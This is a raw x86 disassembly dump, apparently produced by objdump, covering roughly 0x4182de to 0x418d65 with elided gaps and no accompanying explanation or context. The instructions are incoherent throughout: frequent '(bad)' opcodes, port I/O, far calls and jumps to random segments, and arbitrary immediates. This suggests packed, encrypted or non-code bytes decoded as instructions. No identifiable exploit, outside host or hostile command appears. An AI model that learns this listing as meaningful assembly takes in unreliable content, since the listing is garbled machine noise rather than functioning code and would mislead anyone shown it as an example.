  4182de:	les    eax,FWORD PTR [edi-0x5a]
  4182e1:	into   
  4182e2:	xlat   BYTE PTR ds:[ebx]
  4182e3:	jp     0x41833e
  4182e5:	mov    DWORD PTR [ecx+0x747c18c3],ecx
  4182eb:	push   ebp
  4182ec:	dec    edi
  4182ed:	jl     0x4182e9
  4182ef:	aas    
  4182f0:	cwde   
  4182f1:	mov    bl,0xa4
  4182f3:	jns    0x4182b7
  4182f5:	out    0x2c,al
  4182f7:	sub    BYTE PTR [ebx+0x1d],bh
  4182fa:	(bad)  
  4182fb:	ret    0xf1f8
  4182fe:	jle    0x418376
  418300:	sub    al,0x8
  418302:	ins    DWORD PTR es:[edi],dx
  418303:	gs call 0x7959:0x646d11a
  41830b:	xchg   edi,eax
  41830c:	ss add eax,0x728544d3
  418312:	jae    0x418376
  418314:	shl    ecx,1
  418316:	jmp    0x265f6975
  41831b:	jns    0x41832a
  41831d:	pusha  
  41831e:	xor    eax,0x6ef71f00
  418323:	out    0x48,eax
  418325:	push   esp
  418326:	rcl    dh,0x58
  418329:	lds    eax,FWORD PTR [ecx-0x65]
  41832c:	imul   ebp,DWORD PTR [ebx-0x47],0x6c70f99e
  418333:	out    0xf2,eax
  418335:	add    edi,DWORD PTR [esi-0x705d5650]
  41833b:	jns    0x41830c
  41833d:	add    esi,0x8
  418340:	adc    al,0x33
  418342:	(bad)  
  418343:	rol    edi,cl
  418345:	jg     0x41835b
  418347:	jns    0x4183b0
  418349:	jmp    0x41833f
  41834b:	in     eax,dx
  41834c:	test   DWORD PTR [eax],eax
  41834e:	out    dx,al
  41834f:	icebp  
  418350:	loopne 0x41832e
  418352:	mov    esp,0x6a7f52af
  418357:	mov    ecx,0xc198fcec
  41835c:	mov    ds:0x74ee9099,al
  418361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418362:	or     eax,DWORD PTR [ebp+0x106ca143]
  418368:	jmp    0x637c:0x56548176
  41836f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418370:	adc    dh,BYTE PTR [ecx]
  418372:	sub    DWORD PTR [edi-0x5cbf9661],esp
  418378:	mov    ebx,0xc02fdf4c
  41837d:	push   0xffffffbc
  41837f:	push   cs
  418380:	mov    ds,esp
  418382:	and    edi,eax
  418384:	jns    0x4183d0
  418386:	adc    dh,BYTE PTR [edx+0x62]
  418389:	retf   0x841b
  41838c:	(bad)  
  41838d:	sub    eax,0x3ffa2f
	...
  4183f2:	add    BYTE PTR [eax],al
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	cmc    
  418401:	xor    DWORD PTR [eax],0xffffff88
  418404:	ret    0x100
  418407:	add    BYTE PTR ds:0x6e000001,al
  41840d:	cdq    
  41840e:	in     al,dx
  41840f:	xchg   ebx,eax
  418410:	fadd   DWORD PTR [ebx+0x3b46a3df]
  418416:	pop    es
  418417:	jns    0x41840e
  418419:	inc    esp
  41841a:	push   esp
  41841b:	xlat   BYTE PTR ds:[ebx]
  41841c:	(bad)  
  41841d:	in     al,dx
  41841e:	out    dx,al
  41841f:	rol    DWORD PTR [ecx],1
  418421:	cmp    dl,BYTE PTR [edi+0x57]
  418424:	dec    edx
  418425:	mov    ebp,0x2cde671
  41842a:	call   0xb203:0xdce1c95f
  418431:	pop    edx
  418432:	sar    DWORD PTR [ebp-0x58],1
  418435:	adc    eax,0xfd909f84
  41843a:	(bad)  
  41843b:	(bad)  
  41843c:	cld    
  41843d:	ror    ch,1
  41843f:	int3   
  418440:	adc    DWORD PTR [edx],ebp
  418442:	mov    BYTE PTR [ecx+eiz*2],dh
  418445:	aas    
  418446:	pusha  
  418447:	je     0x4183fa
  418449:	mov    al,0xf6
  41844b:	imul   ebx,DWORD PTR [esi-0x3b1d8a6e],0x3f928444
  418455:	retf   0x1cfa
  418458:	and    DWORD PTR [ebp-0x5eff9152],0xde2fb7d6
  418462:	adc    BYTE PTR [eax+0x7e],dl
  418465:	lods   eax,DWORD PTR ds:[esi]
  418466:	adc    bh,BYTE PTR [edi+ebx*2+0x56cdc069]
  41846d:	jg     0x418423
  41846f:	push   ebp
  418470:	jbe    0x4184c2
  418472:	lods   eax,DWORD PTR ds:[esi]
  418473:	cmp    al,0x70
  418475:	(bad)  
  418476:	loope  0x418463
  418478:	std    
  418479:	sub    BYTE PTR [eax],dl
  41847b:	cmp    esi,DWORD PTR [edi+0x2f3615c7]
  418481:	retf   
  418482:	fadd   st,st(5)
  418484:	iret   
  418485:	sub    al,0xca
  418487:	pop    ds
  418488:	xchg   esp,eax
  418489:	dec    esi
  41848a:	mov    edx,0x55865c28
  41848f:	arpl   bx,si
  418491:	dec    edi
  418492:	pop    ebp
  418493:	add    BYTE PTR [ebp-0xf],0x34
  418497:	xchg   edx,eax
  418498:	popa   
  418499:	std    
  41849a:	mov    edi,0x63713be3
  41849f:	clc    
  4184a0:	dec    eax
  4184a1:	sub    al,0x2b
  4184a3:	dec    edi
  4184a4:	scas   al,BYTE PTR es:[edi]
  4184a5:	je     0x4184e9
  4184a7:	lds    ecx,FWORD PTR ds:0x323e6d50
  4184ad:	in     al,dx
  4184ae:	outs   dx,DWORD PTR ss:[esi]
  4184b0:	add    DWORD PTR [ecx],ebx
  4184b2:	rol    cl,cl
  4184b4:	inc    eax
  4184b5:	stos   BYTE PTR es:[edi],al
  4184b6:	xor    esi,edx
  4184b8:	(bad)  
  4184b9:	dec    ebx
  4184ba:	sti    
  4184bb:	xor    eax,0xc26a848f
  4184c0:	inc    ecx
  4184c1:	sahf   
  4184c2:	call   0x4801:0xe8ba4f0
  4184c9:	cs and dl,ah
  4184cc:	dec    edi
  4184cd:	pop    ss
  4184ce:	arpl   WORD PTR [ebp-0x16],bp
  4184d1:	shr    BYTE PTR [ecx-0x4f],cl
  4184d4:	in     al,dx
  4184d5:	adc    eax,0xe28330ff
  4184da:	dec    esi
  4184db:	stos   DWORD PTR es:[edi],eax
  4184dc:	cld    
  4184dd:	sbb    al,0x29
  4184df:	ins    DWORD PTR es:[edi],dx
  4184e0:	add    al,0x1a
  4184e2:	push   0x6c
  4184e4:	sub    DWORD PTR [edi+0x6b918ed9],ecx
  4184ea:	mov    bl,0x59
  4184ec:	stos   DWORD PTR es:[edi],eax
  4184ed:	stc    
  4184ee:	aad    0xa2
  4184f0:	fst    DWORD PTR [eax+esi*8+0x206cf6a2]
  4184f7:	sub    dl,BYTE PTR [esi+0x6a16e88a]
  4184fd:	sti    
  4184fe:	int    0x35
  418500:	fdiv   DWORD PTR [ebp+ecx*1+0x4a]
  418504:	shl    DWORD PTR ds:0xcbeb02e6,0x54
  41850b:	jmp    0xefd690e1
  418510:	js     0x418512
	...
  418572:	add    BYTE PTR [eax],al
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	mov    ebx,0xc722e415
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR ds:0x9e000001,al
  41858d:	pop    ebx
  41858e:	mov    eax,0x6cc77ebb
  418593:	inc    esp
  418594:	stos   DWORD PTR es:[edi],eax
  418595:	idiv   eax
  418597:	mov    al,0x7e
  418599:	mov    edx,esi
  41859b:	mov    eax,0x89e0186c
  4185a0:	xor    eax,0xb5a5dfa
  4185a5:	mov    esi,0x9371f985
  4185aa:	and    edx,esi
  4185ac:	mov    edi,0xe05ff5c8
  4185b1:	push   0x1e
  4185b3:	mov    esi,esp
  4185b5:	nop
  4185b6:	hlt    
  4185b7:	xchg   esp,eax
  4185b8:	mov    edx,0xa08978e3
  4185bd:	neg    BYTE PTR [esi+0x59]
  4185c0:	mov    edx,0x6465ab3f
  4185c5:	rol    BYTE PTR [ebp+edi*2-0x2c0da2fa],0x45
  4185cd:	outs   dx,DWORD PTR ds:[esi]
  4185ce:	and    al,0xaa
  4185d0:	or     BYTE PTR gs:[ebp-0x2c],ah
  4185d4:	fsub   QWORD PTR [ebp-0x21b90a82]
  4185da:	je     0x4185a4
  4185dc:	ss test al,0xb9
  4185df:	mov    dl,BYTE PTR [ebx]
  4185e1:	mov    ds:0x973c540c,eax
  4185e6:	jmp    0x4185c0
  4185e8:	mov    BYTE PTR [ecx-0x52],cl
  4185eb:	and    eax,0x92453698
  4185f0:	add    ah,BYTE PTR [edx+0x4]
  4185f3:	pop    esp
  4185f4:	push   ebx
  4185f5:	in     al,0xd0
  4185f7:	ins    DWORD PTR es:[edi],dx
  4185f8:	mov    ds:0x772d5266,eax
  4185fd:	pop    ebp
  4185fe:	outs   dx,DWORD PTR ds:[esi]
  4185ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418600:	add    BYTE PTR [edi-0x65661353],ah
  418606:	mov    cl,0x8b
  418608:	jp     0x418658
  41860a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41860b:	fst    QWORD PTR [ebx+0x1c]
  41860e:	pop    eax
  41860f:	cwde   
  418610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418611:	das    
  418612:	pop    edi
  418613:	(bad)  
  418614:	rol    cl,1
  418616:	call   0x33f2:0x264270e1
  41861d:	xchg   edx,eax
  41861e:	addr16 and eax,0xc53e2b8
  418624:	dec    ecx
  418625:	adc    ecx,DWORD PTR [ebx+ecx*2]
  418628:	dec    edx
  418629:	or     DWORD PTR [esi-0x3d8ab501],ebp
  41862f:	sti    
  418630:	add    esi,DWORD PTR ds:0x5b2ff0ea
  418636:	push   0x1c
  418638:	mov    edi,0xb8b83999
  41863d:	fisubr DWORD PTR [ebp+edi*1-0x3b]
  418641:	inc    ecx
  418642:	(bad)  
  418643:	jmp    0x412a:0x435ef77e
  41864a:	repz push edi
  41864c:	in     eax,dx
  41864d:	push   esi
  41864e:	es push eax
  418650:	or     BYTE PTR [ecx-0x4f],0xe4
  418654:	adc    DWORD PTR [esi-0x420056ce],0xffffffc5
  41865b:	inc    DWORD PTR ds:0x8ebb6bff
  418661:	cmp    al,0xd7
  418663:	adc    al,0xbb
  418665:	push   esi
  418666:	jmp    0x41860f
  418668:	rcl    BYTE PTR [eax+0x4a],cl
  41866b:	and    DWORD PTR [edx-0x12],eax
  41866e:	(bad)  
  41866f:	aaa    
  418670:	test   DWORD PTR [ebx+0x61bc553a],esp
  418676:	mov    edx,0xe2ff18fb
  41867b:	or     BYTE PTR [ebx],dl
  41867d:	xchg   DWORD PTR [ebx+edi*2+0x89d3465],ecx
  418684:	adc    BYTE PTR [ebx-0x1ce0a29a],0xd6
  41868b:	dec    ecx
  41868c:	nop
  41868d:	mov    edi,edi
  41868f:	clc    
  418690:	push   ebp
	...
  4186f1:	add    BYTE PTR [eax],al
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	sar    BYTE PTR [ebx+0x2cc9aae],cl
  418706:	add    DWORD PTR [eax],eax
  418708:	add    eax,0xca000001
  41870d:	jmp    0x60e3a70a
  418712:	aaa    
  418713:	inc    edi
  418714:	push   edi
  418715:	cmp    ch,cl
  418717:	ins    BYTE PTR es:[edi],dx
  418718:	add    edx,ecx
  41871a:	aad    0x60
  41871c:	mov    ch,BYTE PTR [eax-0x495d37a6]
  418722:	mov    esp,0x9908d85
  418727:	popa   
  418728:	push   esp
  418729:	lahf   
  41872a:	in     eax,dx
  41872b:	add    dh,BYTE PTR [esi]
  41872d:	popa   
  41872e:	jle    0x418719
  418730:	xor    al,0xfb
  418732:	push   0x25
  418734:	jo     0x4187a1
  418736:	dec    ebp
  418737:	xor    BYTE PTR [edi+esi*1-0x51038f03],ch
  41873e:	sahf   
  41873f:	or     BYTE PTR [ebp+0x3c],0x71
  418743:	xor    al,0x92
  418745:	in     eax,dx
  418746:	mov    DWORD PTR fs:[edi],ecx
  418749:	inc    esi
  41874a:	add    eax,0x1c934523
  41874f:	jmp    0x29244513
  418754:	repz test eax,0x3cc562e0
  41875a:	out    0x72,al
  41875c:	mov    edx,0x510e6b63
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	jge    0x418730
  418764:	in     al,0x8d
  418766:	ins    BYTE PTR es:[edi],dx
  418767:	mov    WORD PTR [ecx],fs
  418769:	mov    dl,0xe5
  41876b:	dec    ebp
  41876c:	pop    ds
  41876d:	int    0xba
  41876f:	pop    ebx
  418770:	push   esp
  418771:	cld    
  418772:	pop    esp
  418773:	out    dx,eax
  418774:	dec    esp
  418775:	arpl   bp,bx
  418777:	out    dx,al
  418778:	mov    eax,ds:0x5958830b
  41877d:	fidiv  WORD PTR [ebx+0x17782130]
  418783:	loope  0x418725
  418785:	adc    cl,BYTE PTR [esp+ebx*4]
  418788:	fdivr  DWORD PTR [esi-0x36c63f29]
  41878e:	cmp    dl,BYTE PTR [eax+edi*1]
  418791:	pop    esi
  418792:	sub    al,0x1c
  418794:	cmc    
  418795:	sub    DWORD PTR [esi+edi*1],ebx
  418798:	dec    eax
  418799:	cwde   
  41879a:	scas   al,BYTE PTR es:[edi]
  41879b:	adc    BYTE PTR [edi+0x53],dl
  41879e:	sbb    DWORD PTR [eax+edx*1],ebp
  4187a1:	sti    
  4187a2:	inc    esi
  4187a3:	jbe    0x41877e
  4187a5:	and    DWORD PTR [edi-0x62d087b4],esi
  4187ab:	stos   DWORD PTR es:[edi],eax
  4187ac:	dec    ebp
  4187ad:	add    BYTE PTR [esi],al
  4187af:	inc    edi
  4187b0:	dec    eax
  4187b1:	scas   eax,DWORD PTR es:[edi]
  4187b2:	out    dx,al
  4187b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187b4:	and    cl,BYTE PTR [ebp+esi*8+0x7a97cbe9]
  4187bb:	mov    cl,0xdb
  4187bd:	bound  ebp,QWORD PTR [ebx]
  4187bf:	imul   ebp,DWORD PTR [ebp-0x3f],0xfffffff0
  4187c3:	sub    eax,0xb35e596b
  4187c8:	fistp  WORD PTR [edx-0x56]
  4187cb:	out    0xbb,al
  4187cd:	outs   dx,BYTE PTR ds:[esi]
  4187ce:	or     esp,esp
  4187d0:	pop    esp
  4187d1:	mul    ah
  4187d3:	std    
  4187d4:	xchg   ebp,eax
  4187d5:	pop    es
  4187d6:	fsub   QWORD PTR [ebx-0x6b9237c]
  4187dc:	imul   edx,DWORD PTR [edx],0x84c94776
  4187e2:	retf   0x4332
  4187e5:	inc    ebx
  4187e6:	sbb    BYTE PTR [esp+edi*8+0x61],bl
  4187ea:	sbb    esp,DWORD PTR [edi-0x56f6e953]
  4187f0:	shl    DWORD PTR [edi],cl
  4187f2:	sub    al,BYTE PTR [edi]
  4187f4:	stos   BYTE PTR es:[edi],al
  4187f5:	or     bh,BYTE PTR [ebx+eiz*1-0x71c5768e]
  4187fc:	shr    DWORD PTR [ebx+ebp*2+0x64c9832b],0x84
  418804:	jmp    0xe29e:0x6ec7ce18
  41880b:	ins    DWORD PTR es:[edi],dx
  41880c:	add    dh,ah
  41880e:	push   eax
  41880f:	sub    eax,0xc4
	...
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x149c3acd]
  418881:	xchg   ecx,eax
  418882:	lods   eax,DWORD PTR ds:[esi]
  418883:	inc    esp
  418884:	rol    DWORD PTR [ebx],1
  418886:	add    DWORD PTR [eax],eax
  418888:	add    eax,0xa7000001
  41888d:	and    al,0x97
  41888f:	or     eax,0xfae4afb0
  418894:	std    
  418895:	data16 mov cl,0x85
  418898:	ja     0x41881f
  41889a:	test   BYTE PTR [eax+0x44f24b31],dh
  4188a0:	xor    eax,0xc3abcd91
  4188a5:	fdivr  DWORD PTR [esi-0x16ed8023]
  4188ab:	or     al,0xa3
  4188ad:	sub    BYTE PTR [eax-0xb],ah
  4188b0:	rcr    BYTE PTR [edi+0x1e38c08b],0x59
  4188b7:	or     BYTE PTR [ebp-0x67],bl
  4188ba:	adc    DWORD PTR [edi],edi
  4188bc:	imul   edx,DWORD PTR [edi-0x5a4d3b51],0x1039e69f
  4188c6:	and    eax,0xb1d71a8c
  4188cb:	sbb    BYTE PTR [ecx],0xe
  4188ce:	sbb    al,0xb8
  4188d0:	stos   BYTE PTR es:[edi],al
  4188d1:	mov    dl,dh
  4188d3:	mov    dh,0xe5
  4188d5:	sub    eax,0xbf3991b4
  4188da:	fld    st(4)
  4188dc:	div    DWORD PTR [esi]
  4188de:	jns    0x418890
  4188e0:	int    0x33
  4188e2:	fpatan 
  4188e4:	and    al,0xe5
  4188e6:	sbb    bl,bl
  4188e8:	data16 (bad) 
  4188ea:	mov    DWORD PTR [edx],esp
  4188ec:	in     eax,0x9c
  4188ee:	loope  0x4188f6
  4188f0:	lahf   
  4188f1:	inc    ebx
  4188f2:	test   al,0x21
  4188f4:	fisub  DWORD PTR [ebp-0x55c30dcf]
  4188fa:	xor    esi,DWORD PTR [ebx]
  4188fc:	jp     0x418951
  4188fe:	inc    ecx
  4188ff:	and    bh,BYTE PTR [ebx-0x3a920356]
  418905:	xor    DWORD PTR [ecx],eax
  418907:	outs   dx,BYTE PTR ds:[esi]
  418908:	cdq    
  418909:	push   0x15
  41890b:	in     al,0x49
  41890d:	push   ebp
  41890e:	enter  0x6dfb,0x21
  418912:	jmp    0x4188ad
  418914:	mov    WORD PTR [edi+ecx*8-0x4974409a],ss
  41891b:	rol    DWORD PTR [edx+0x1],cl
  41891e:	int3   
  41891f:	push   edi
  418920:	out    0xc3,eax
  418922:	aam    0xcf
  418924:	adc    eax,0x9cefdbb
  418929:	not    BYTE PTR [esi]
  41892b:	jle    0x4188b5
  41892d:	dec    edi
  41892e:	in     eax,0x67
  418930:	aaa    
  418931:	sbb    eax,0x8ab0e9c9
  418936:	xor    al,BYTE PTR [ecx+0x543e12df]
  41893c:	xor    BYTE PTR [ecx+edx*1],bh
  41893f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418940:	fsubr  QWORD PTR [ecx+ecx*8+0x10]
  418944:	addr16 leave 
  418946:	inc    esi
  418947:	call   0x8208:0x277068f3
  41894e:	pop    ss
  41894f:	leave  
  418950:	dec    eax
  418951:	stc    
  418952:	mov    cl,0xbc
  418954:	jo     0x4189a4
  418956:	call   0x7036:0x97cebd9e
  41895d:	mov    cl,0xfc
  41895f:	cmp    eax,0x8366e4c5
  418964:	cwde   
  418965:	int3   
  418966:	call   FWORD PTR [edi+0x63011c3d]
  41896c:	jle    0x4189be
  41896e:	sbb    ah,BYTE PTR [ebx]
  418970:	sbb    BYTE PTR [ebx-0x70],0xff
  418974:	mov    cl,0x3c
  418976:	stc    
  418977:	ret    
  418978:	and    eax,0x5db8ab5c
  41897d:	imul   DWORD PTR [esi+edi*1]
  418980:	and    eax,DWORD PTR [eax+0x1f]
  418983:	rol    edi,0xfd
  418986:	fcom   QWORD PTR [esp+eiz*4]
  418989:	mov    bh,0xe4
  41898b:	test   BYTE PTR [esi+0x38],0xd7
  41898f:	mov    dh,0xcd
	...
  4189f1:	add    BYTE PTR [eax],al
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xb0428e69
  418a03:	aam    0xd6
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0xa000001,al
  418a0d:	or     edx,DWORD PTR [esi-0x5533cdc5]
  418a13:	adc    al,0x2
  418a15:	sub    ebp,DWORD PTR [esi]
  418a17:	or     BYTE PTR [ecx],cl
  418a19:	jno    0x418a37
  418a1b:	int    0x9b
  418a1d:	jno    0x418a89
  418a1f:	xchg   cl,ch
  418a21:	pop    esp
  418a22:	push   edx
  418a23:	or     BYTE PTR [edx+0x87c6ffd],al
  418a29:	out    dx,eax
  418a2a:	dec    eax
  418a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a2c:	retf   0x7ae9
  418a2f:	pop    es
  418a30:	jo     0x418a40
  418a32:	stos   DWORD PTR es:[edi],eax
  418a33:	adc    eax,0xffffffc5
  418a36:	in     al,0x50
  418a38:	loope  0x418a82
  418a3a:	or     al,0xc8
  418a3c:	sub    dh,BYTE PTR [ebx]
  418a3e:	lods   eax,DWORD PTR ds:[esi]
  418a3f:	adc    al,0x54
  418a41:	mov    ebx,?
  418a43:	mov    edi,0xde55a0ce
  418a48:	sbb    esp,edi
  418a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a4b:	mov    dh,0xde
  418a4d:	addr16 inc edx
  418a4f:	hlt    
  418a50:	cmp    DWORD PTR [esp+eax*4+0x6],ecx
  418a54:	or     al,BYTE PTR [ebp-0x8]
  418a57:	sar    BYTE PTR [ebx+eiz*8+0x74],cl
  418a5b:	rol    BYTE PTR [ebx+0x773d1193],cl
  418a61:	or     esi,ebx
  418a63:	push   0xffffffdd
  418a65:	pop    ecx
  418a66:	xor    esp,DWORD PTR [edi+0x10]
  418a69:	or     al,0x5f
  418a6b:	xor    esp,DWORD PTR [edx]
  418a6d:	push   edi
  418a6e:	mov    bh,ah
  418a70:	pop    ss
  418a71:	ja     0x418a0a
  418a73:	add    ch,cl
  418a75:	fld    DWORD PTR [ecx]
  418a77:	fwait
  418a78:	dec    esi
  418a79:	into   
  418a7a:	pop    ss
  418a7b:	cli    
  418a7c:	push   cs
  418a7d:	ret    0xcbde
  418a80:	pop    ecx
  418a81:	dec    ebp
  418a82:	xchg   edx,eax
  418a83:	sbb    edi,ebp
  418a85:	add    dh,BYTE PTR [esi+0x35]
  418a88:	jp     0x418a9a
  418a8a:	xor    eax,0x2a614299
  418a8f:	lods   al,BYTE PTR ds:[esi]
  418a90:	cmp    bl,0xb
  418a93:	mov    cl,BYTE PTR [esp+eax*8]
  418a96:	dec    ebx
  418a97:	add    ebx,DWORD PTR [esi-0x7b]
  418a9a:	dec    edx
  418a9b:	sbb    esi,edi
  418a9d:	sbb    bh,cl
  418a9f:	inc    ebp
  418aa0:	add    BYTE PTR [esp+edx*8+0x15c9dfea],0xfc
  418aa8:	sub    ch,BYTE PTR [eax]
  418aaa:	sub    al,0x20
  418aac:	lahf   
  418aad:	jmp    0x418ad1
  418aaf:	push   cs
  418ab0:	mov    WORD PTR [esp+eiz*4],es
  418ab3:	es jle 0x418a5a
  418ab6:	mov    dh,0x99
  418ab8:	arpl   WORD PTR [ebx],cx
  418aba:	mov    al,0x37
  418abc:	jl     0x418a77
  418abe:	cmc    
  418abf:	test   al,0xd9
  418ac1:	retf   
  418ac2:	pop    edi
  418ac3:	jmp    0xbeecd678
  418ac8:	dec    esp
  418ac9:	xchg   ebp,eax
  418aca:	pop    ecx
  418acb:	push   cs
  418acc:	out    dx,al
  418acd:	int3   
  418ace:	loope  0x418b3c
  418ad0:	inc    esi
  418ad1:	pushf  
  418ad2:	lds    eax,FWORD PTR [esi-0x7b]
  418ad5:	stc    
  418ad6:	sbb    esp,DWORD PTR es:[eax+0x7dd9fec]
  418add:	push   es
  418ade:	int3   
  418adf:	loopne 0x418b1e
  418ae1:	stc    
  418ae2:	add    BYTE PTR [ecx+0x5f],cl
  418ae5:	adc    ebp,edx
  418ae7:	lahf   
  418ae8:	push   0x26e65ef7
  418aed:	push   ebx
  418aee:	inc    eax
  418aef:	push   cs
  418af0:	mov    ds:0x431c71ec,eax
  418af5:	sub    eax,0xf505fdaf
  418afa:	(bad)  [eax+0x23]
  418afd:	push   ebx
  418afe:	cli    
  418aff:	xor    eax,0xb35338c0
  418b04:	push   ss
  418b05:	retf   
  418b06:	shl    DWORD PTR [edx-0x2a],0xce
  418b0a:	mov    gs,WORD PTR [eax-0x3afafa11]
  418b10:	dec    eax
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xeb
  418b81:	jbe    0x418b66
  418b83:	and    ebx,ebx
  418b85:	add    eax,0x1050001
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	imul   ebx,DWORD PTR [ecx+esi*4+0xf],0x11
  418b91:	stos   DWORD PTR es:[edi],eax
  418b92:	outs   dx,DWORD PTR ds:[esi]
  418b93:	xor    dh,BYTE PTR [ecx]
  418b95:	ins    BYTE PTR es:[edi],dx
  418b96:	mov    dl,BYTE PTR ds:0xa752cd00
  418b9c:	mov    edi,0x61b610f
  418ba1:	adc    esi,DWORD PTR [ebx+0x3228ba48]
  418ba7:	mov    BYTE PTR [esi-0x5c],bl
  418baa:	adc    al,0x79
  418bac:	add    BYTE PTR [ecx+eax*1],ch
  418baf:	mov    edx,0x35c2cbce
  418bb4:	jo     0x418b6e
  418bb6:	enter  0x54c4,0x7d
  418bba:	mov    al,ds:0x8f02c84b
  418bbf:	shl    BYTE PTR [ecx-0x389109b5],0xe7
  418bc6:	pusha  
  418bc7:	xor    ch,ch
  418bc9:	adc    DWORD PTR [edx+ebp*2+0x31],eax
  418bcd:	popa   
  418bce:	mov    ds:0xe8d90b37,al
  418bd3:	mov    eax,ds:0xeb6d83a
  418bd8:	pushf  
  418bd9:	daa    
  418bda:	pop    ebx
  418bdb:	lods   al,BYTE PTR ds:[esi]
  418bdc:	cmp    BYTE PTR [ecx+0x302ca6ba],dh
  418be2:	fldenv [ecx+0x5e88ffa9]
  418be8:	inc    ebp
  418be9:	mov    DWORD PTR [ebp-0x5e05307b],ebx
  418bef:	pushf  
  418bf0:	and    al,0x37
  418bf2:	jl     0x418bff
  418bf4:	fldenv [ebx]
  418bf6:	test   al,0x8b
  418bf8:	inc    ebx
  418bf9:	retf   0x86e7
  418bfc:	mov    cl,dh
  418bfe:	lea    ebx,[edx]
  418c00:	adc    DWORD PTR [eax],0xcd662d9b
  418c06:	jmp    0x418bfb
  418c08:	push   0xffffffc7
  418c0a:	mov    al,0x60
  418c0c:	adc    al,0x1e
  418c0e:	mov    ds:0xcaf6a67b,eax
  418c13:	fstp   TBYTE PTR [ebx-0x2a]
  418c16:	or     bh,BYTE PTR [ecx]
  418c18:	int    0x28
  418c1a:	lods   eax,DWORD PTR ds:[esi]
  418c1b:	imul   edi
  418c1d:	adc    ecx,DWORD PTR [ecx+0x2589e172]
  418c23:	aaa    
  418c24:	imul   edi,ebp,0x576b394a
  418c2a:	jae    0x418be9
  418c2c:	nop
  418c2d:	fisttp DWORD PTR [ebx+0xb]
  418c30:	mov    esi,DWORD PTR [ecx]
  418c32:	into   
  418c33:	dec    edi
  418c34:	out    dx,eax
  418c35:	jno    0x418bc7
  418c37:	push   edx
  418c38:	pop    esp
  418c39:	inc    eax
  418c3a:	and    esi,DWORD PTR [ecx+ebx*8+0x54b82bd6]
  418c41:	pushf  
  418c42:	out    0x0,al
  418c44:	and    BYTE PTR [edx+0x8b399cf],dl
  418c4a:	adc    DWORD PTR [ebx-0x6f96c81],eax
  418c50:	jg     0x418c78
  418c52:	and    BYTE PTR [ebx],ah
  418c54:	popf   
  418c55:	les    ecx,FWORD PTR [edi+0x61]
  418c58:	scas   eax,DWORD PTR es:[edi]
  418c59:	iret   
  418c5a:	ret    0xd51a
  418c5d:	jmp    0x8eef:0xe190c6bc
  418c64:	shr    DWORD PTR [edi+0x2d],1
  418c67:	sbb    edx,DWORD PTR [eax]
  418c69:	vpsubsb ymm1,ymm1,YMMWORD PTR [ebp+0x72]
  418c6e:	idiv   BYTE PTR [ecx-0x14357b7a]
  418c74:	dec    ebx
  418c75:	sbb    al,0x0
  418c77:	bound  esp,QWORD PTR [ebp+0x4ada0203]
  418c7d:	(bad)  
  418c7e:	sub    eax,0x12de1643
  418c83:	scas   al,BYTE PTR es:[edi]
  418c84:	xchg   BYTE PTR [edi],al
  418c86:	imul   esi,DWORD PTR [ebx],0x2511c6de
  418c8c:	scas   al,BYTE PTR es:[edi]
  418c8d:	repz cs cdq 
  418c90:	xor    DWORD PTR [eax],eax
	...
  418cf2:	add    BYTE PTR [eax],al
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	ror    BYTE PTR [ecx-0x1fb6ada7],cl
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0x92000001
  418d0d:	sti    
  418d0e:	jae    0x418cb9
  418d10:	cwde   
  418d11:	ins    BYTE PTR es:[edi],dx
  418d12:	loopne 0x418d40
  418d14:	and    cl,BYTE PTR [edx+0x4550d622]
  418d1a:	dec    ebx
  418d1b:	(bad)  
  418d1c:	loopne 0x418d61
  418d1e:	repz scas eax,DWORD PTR es:[edi]
  418d20:	(bad)
  418d25:	adc    DWORD PTR [edi+eax*2+0x1b],edx
  418d29:	das    
  418d2a:	xor    eax,0xcb66df9d
  418d2f:	stos   DWORD PTR es:[edi],eax
  418d30:	and    eax,0x689a62c6
  418d35:	lods   al,BYTE PTR ds:[esi]
  418d36:	cmp    esi,esp
  418d38:	iret   
  418d39:	pavgb  mm5,QWORD PTR [ebx+0x70206a0d]
  418d40:	push   ebp
  418d41:	imul   edx,DWORD PTR [ebx-0x5a7db842],0x60
  418d48:	setb   dl
  418d4b:	mov    WORD PTR [ebp-0x3e],gs
  418d4e:	ret    0xd689
  418d51:	adc    ch,bl
  418d53:	cwde   
  418d54:	test   eax,0x50b01d59
  418d59:	nop
  418d5a:	adc    eax,0xba0aa0fe
  418d5f:	adc    ch,BYTE PTR [esi+0x51d8b1ec]
  418d65:	inc    edi
